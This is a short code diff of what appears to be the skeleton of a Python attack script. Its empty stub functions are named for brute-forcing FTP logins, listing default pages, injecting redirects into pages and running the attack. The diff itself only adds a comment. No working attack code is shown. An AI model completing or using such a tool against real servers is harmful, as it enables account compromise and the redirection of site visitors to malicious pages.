@@ -30,7 +30,7 @@ def bruteLogin(hostname, passFile):
 def defaultPages(ftp):  # take a FTP connection as argument
     pass
 
-def injectPage(ftp, page, redirect):
+def injectPage(ftp, page, redirect): # take a FTP connection as argument
     pass
 
 def attack(username, password, targetHost, redirect):
